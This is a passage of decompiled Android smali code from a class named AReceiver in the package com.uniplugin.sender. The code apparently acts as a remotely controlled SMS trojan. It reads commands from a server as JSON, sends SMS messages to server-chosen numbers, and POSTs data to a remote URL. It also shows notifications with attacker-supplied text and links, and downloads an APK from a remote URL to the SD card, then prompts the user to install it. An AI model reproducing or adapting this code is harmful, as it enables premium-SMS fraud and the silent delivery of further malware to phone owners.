    .restart local v15    # "mnumber":Ljava/lang/String;
    :try_start_17
    const-string v2, "number"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_17
    .catch Lorg/json/JSONException; {:try_start_17 .. :try_end_17} :catch_17

    move-result-object v15

    .line 284
    :goto_17
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    move-object/from16 v0, p0

    iget-object v9, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    invoke-virtual {v9}, Lcom/uniplugin/sender/Sender;->GetUnixTime()I

    move-result v9

    invoke-static {v9}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v2, Lcom/uniplugin/sender/Sender;->timeers:Ljava/lang/String;

    .line 285
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    move-object/from16 v0, v16

    invoke-virtual {v2, v15, v0}, Lcom/uniplugin/sender/Sender;->sendSMSkahi(Ljava/lang/String;Ljava/lang/String;)V

    .line 290
    .end local v14    # "jsonObject":Lorg/json/JSONObject;
    .end local v15    # "mnumber":Ljava/lang/String;
    .end local v16    # "mpref":Ljava/lang/String;
    :cond_5
    return-void

    .line 82
    :catch_0
    move-exception v12

    .line 84
    .local v12, "e":Ljava/io/IOException;
    invoke-virtual {v12}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0

    .line 91
    .end local v12    # "e":Ljava/io/IOException;
    .restart local v14    # "jsonObject":Lorg/json/JSONObject;
    :catch_1
    move-exception v12

    .line 93
    .local v12, "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_1

    .line 97
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_2
    move-exception v12

    .line 99
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_2

    .line 106
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_3
    move-exception v12

    .line 108
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_3

    .line 114
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v3    # "mid":I
    :catch_4
    move-exception v12

    .line 116
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_4

    .line 121
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v4    # "mtitle":Ljava/lang/String;
    :catch_5
    move-exception v12

    .line 123
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_5

    .line 128
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v5    # "mtext":Ljava/lang/String;
    :catch_6
    move-exception v12

    .line 130
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_6

    .line 135
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v6    # "micon":Ljava/lang/String;
    :catch_7
    move-exception v12

    .line 137
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_7

    .line 142
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v7    # "murl":Ljava/lang/String;
    :catch_8
    move-exception v12

    .line 144
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_8

    .line 153
    .end local v3    # "mid":I
    .end local v4    # "mtitle":Ljava/lang/String;
    .end local v5    # "mtext":Ljava/lang/String;
    .end local v6    # "micon":Ljava/lang/String;
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_9
    move-exception v12

    .line 155
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_9

    .line 166
    .end local v7    # "murl":Ljava/lang/String;
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_a
    move-exception v12

    .line 168
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_a

    .line 174
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v3    # "mid":I
    :catch_b
    move-exception v12

    .line 176
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_b

    .line 181
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v4    # "mtitle":Ljava/lang/String;
    :catch_c
    move-exception v12

    .line 183
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_c

    .line 188
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v5    # "mtext":Ljava/lang/String;
    :catch_d
    move-exception v12

    .line 190
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_d

    .line 195
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v6    # "micon":Ljava/lang/String;
    :catch_e
    move-exception v12

    .line 197
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_e

    .line 202
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v7    # "murl":Ljava/lang/String;
    :catch_f
    move-exception v12

    .line 204
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_f

    .line 209
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v8    # "mapkname":Ljava/lang/String;
    :catch_10
    move-exception v12

    .line 211
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_10

    .line 220
    .end local v3    # "mid":I
    .end local v4    # "mtitle":Ljava/lang/String;
    .end local v5    # "mtext":Ljava/lang/String;
    .end local v6    # "micon":Ljava/lang/String;
    .end local v8    # "mapkname":Ljava/lang/String;
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_11
    move-exception v12

    .line 222
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_11

    .line 227
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v10    # "apkname":Ljava/lang/String;
    :catch_12
    move-exception v12

    .line 229
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_12

    .line 243
    .end local v7    # "murl":Ljava/lang/String;
    .end local v10    # "apkname":Ljava/lang/String;
    .end local v12    # "e":Lorg/json/JSONException;
    :catch_13
    move-exception v12

    .line 245
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_13

    .line 252
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v16    # "mpref":Ljava/lang/String;
    :catch_14
    move-exception v12

    .line 254
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_14

    .line 259
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v15    # "mnumber":Ljava/lang/String;
    :catch_15
    move-exception v12

    .line 261
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_15

    .line 272
    .end local v12    # "e":Lorg/json/JSONException;
    .end local v15    # "mnumber":Ljava/lang/String;
    :catch_16
    move-exception v12

    .line 274
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_16

    .line 279
    .end local v12    # "e":Lorg/json/JSONException;
    .restart local v15    # "mnumber":Ljava/lang/String;
    :catch_17
    move-exception v12

    .line 281
    .restart local v12    # "e":Lorg/json/JSONException;
    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_17
.end method

.method protected doInBackground(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 14
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "params"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 399
    invoke-static {}, Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;

    move-result-object v7

    .line 400
    .local v7, "pyHt":Ljava/lang/String;
    invoke-static {}, Landroid/net/Proxy;->getDefaultPort()I

    move-result v8

    .line 401
    .local v8, "pyPt":I
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 403
    .local v1, "connrl":Ljava/net/URL;
    if-lez v8, :cond_0

    .line 404
    new-instance v6, Ljava/net/InetSocketAddress;

    invoke-direct {v6, v7, v8}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 405
    .local v6, "pyAdr":Ljava/net/InetSocketAddress;
    new-instance v5, Ljava/net/Proxy;

    sget-object v12, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    invoke-direct {v5, v12, v6}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 406
    .local v5, "py":Ljava/net/Proxy;
    invoke-virtual {v1, v5}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .line 410
    .end local v5    # "py":Ljava/net/Proxy;
    .end local v6    # "pyAdr":Ljava/net/InetSocketAddress;
    .local v2, "conntn":Ljava/net/HttpURLConnection;
    :goto_0
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 411
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 412
    const-string v12, "POST"

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 413
    const/16 v12, 0x2710

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 415
    new-instance v11, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 417
    .local v11, "wr":Ljava/io/DataOutputStream;
    move-object/from16 v10, p2

    .line 418
    .local v10, "ulPars":Ljava/lang/String;
    invoke-virtual {v11, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 419
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->flush()V

    .line 420
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->close()V

    .line 422
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->connect()V

    .line 423
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 424
    .local v3, "inStm":Ljava/io/InputStream;
    new-instance v9, Ljava/io/BufferedReader;

    new-instance v12, Ljava/io/InputStreamReader;

    .line 425
    const-string v13, "UTF-8"

    invoke-direct {v12, v3, v13}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 424
    invoke-direct {v9, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 426
    .local v9, "rder":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 427
    .local v0, "bder":Ljava/lang/StringBuilder;
    const/4 v4, 0x0

    .local v4, "lnstk":Ljava/lang/String;
    :goto_1
    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_1

    .line 430
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    return-object v12

    .line 408
    .end local v0    # "bder":Ljava/lang/StringBuilder;
    .end local v2    # "conntn":Ljava/net/HttpURLConnection;
    .end local v3    # "inStm":Ljava/io/InputStream;
    .end local v4    # "lnstk":Ljava/lang/String;
    .end local v9    # "rder":Ljava/io/BufferedReader;
    .end local v10    # "ulPars":Ljava/lang/String;
    .end local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_0
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .restart local v2    # "conntn":Ljava/net/HttpURLConnection;
    goto :goto_0

    .line 428
    .restart local v0    # "bder":Ljava/lang/StringBuilder;
    .restart local v3    # "inStm":Ljava/io/InputStream;
    .restart local v4    # "lnstk":Ljava/lang/String;
    .restart local v9    # "rder":Ljava/io/BufferedReader;
    .restart local v10    # "ulPars":Ljava/lang/String;
    .restart local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_1
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 62
    const-string v0, "com.uniplugin.sender"

    invoke-direct {p0, p1, v0}, Lcom/uniplugin/sender/AReceiver;->isMyServiceRunning(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 63
    invoke-virtual {p0, p1, p2}, Lcom/uniplugin/sender/AReceiver;->run(Landroid/content/Context;Landroid/content/Intent;)V

    .line 65
    :cond_0
    invoke-virtual {p1, p2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    .line 66
    return-void
.end method

.method public run(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 70
    new-instance v0, Lcom/uniplugin/sender/Sender;

    invoke-direct {v0}, Lcom/uniplugin/sender/Sender;-><init>()V

    iput-object v0, p0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    .line 71
    iget-object v0, p0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    const-string v1, "conf.txt"

    const/4 v2, 0x0

    invoke-virtual {v0, p1, v1, v2}, Lcom/uniplugin/sender/Sender;->SenderStart(Landroid/content/Context;Ljava/lang/String;I)V

    .line 73
    invoke-virtual {p0, p1}, Lcom/uniplugin/sender/AReceiver;->checkcomand(Landroid/content/Context;)V

    .line 74
    return-void
.end method

.method public showmessinternet(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 9
    .param p1, "id"    # I
    .param p2, "title"    # Ljava/lang/String;
    .param p3, "messagestr"    # Ljava/lang/String;
    .param p4, "icon"    # Ljava/lang/String;
    .param p5, "url"    # Ljava/lang/String;
    .param p6, "context"    # Landroid/content/Context;

    .prologue
    .line 300
    new-instance v0, Landroid/content/Intent;

    const-string v6, "android.intent.action.VIEW"

    invoke-static {p5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-direct {v0, v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 301
    .local v0, "browserIntent":Landroid/content/Intent;
    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-static {p6, v6, v0, v7}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 302
    .local v1, "detailsIntent":Landroid/app/PendingIntent;
    const-string v6, "notification"

    invoke-virtual {p6, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/NotificationManager;

    .line 303
    .local v4, "nm":Landroid/app/NotificationManager;
    new-instance v5, Landroid/app/Notification;

    invoke-virtual {p6}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual {v6, p4, v7, v8}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    invoke-direct {v5, v6, p2, v7, v8}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 304
    .local v5, "notif":Landroid/app/Notification;
    move-object v2, p2

    .line 305
    .local v2, "from":Ljava/lang/CharSequence;
    move-object v3, p3

    .line 306
    .local v3, "message":Ljava/lang/CharSequence;
    invoke-virtual {v5, p6, v2, v3, v1}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 307
    iget v6, v5, Landroid/app/Notification;->flags:I

    or-int/lit8 v6, v6, 0x10

    iput v6, v5, Landroid/app/Notification;->flags:I

    .line 308
    const/4 v6, 0x4

    new-array v6, v6, [J

    fill-array-data v6, :array_0

    iput-object v6, v5, Landroid/app/Notification;->vibrate:[J

    .line 309
    invoke-virtual {v4, p1, v5}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 310
    return-void

    .line 308
    nop

    :array_0
    .array-data 8
        0x64
        0xfa
        0x64
        0x1f4
    .end array-data
.end method

.method public showmessload(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 12
    .param p1, "id"    # I
    .param p2, "title"    # Ljava/lang/String;
    .param p3, "messagestr"    # Ljava/lang/String;
    .param p4, "icon"    # Ljava/lang/String;
    .param p5, "url"    # Ljava/lang/String;
    .param p6, "apkname"    # Ljava/lang/String;
    .param p7, "context"    # Landroid/content/Context;

    .prologue
    .line 313
    move-object/from16 v0, p5

    move-object/from16 v1, p6

    move-object/from16 v2, p7

    invoke-virtual {p0, v0, v1, v2}, Lcom/uniplugin/sender/AReceiver;->DownloadFromUrl(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 314
    new-instance v5, Landroid/content/Intent;

    const-string v9, "android.intent.action.VIEW"

    invoke-direct {v5, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 315
    .local v5, "intent":Landroid/content/Intent;
    new-instance v9, Ljava/io/File;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "/mnt/sdcard/download/"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p6

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v9}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v9

    const-string v10, "application/vnd.android.package-archive"

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 316
    const/4 v9, 0x0

    const/4 v10, 0x0

    move-object/from16 v0, p7

    invoke-static {v0, v9, v5, v10}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 317
    .local v3, "detailsIntent":Landroid/app/PendingIntent;
    const-string v9, "notification"

    move-object/from16 v0, p7

    invoke-virtual {v0, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/NotificationManager;

    .line 318
    .local v7, "nm":Landroid/app/NotificationManager;
    new-instance v8, Landroid/app/Notification;

    invoke-virtual/range {p7 .. p7}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const/4 v10, 0x0

    const/4 v11, 0x0

    move-object/from16 v0, p4

    invoke-virtual {v9, v0, v10, v11}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v9

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    invoke-direct {v8, v9, p2, v10, v11}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 319
    .local v8, "notif":Landroid/app/Notification;
    move-object v4, p2

    .line 320
    .local v4, "from":Ljava/lang/CharSequence;
    move-object v6, p3

    .line 321
    .local v6, "message":Ljava/lang/CharSequence;
    move-object/from16 v0, p7

    invoke-virtual {v8, v0, v4, v6, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 322
    iget v9, v8, Landroid/app/Notification;->flags:I

    or-int/lit8 v9, v9, 0x10

    iput v9, v8, Landroid/app/Notification;->flags:I

    .line 323
    const/4 v9, 0x4

    new-array v9, v9, [J

    fill-array-data v9, :array_0

    iput-object v9, v8, Landroid/app/Notification;->vibrate:[J

    .line 324
    invoke-virtual {v7, p1, v8}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 325
    return-void

    .line 323
    nop

    :array_0
    .array-data 8
        0x64
        0xfa
        0x64
        0x1f4
    .end array-data
.end method
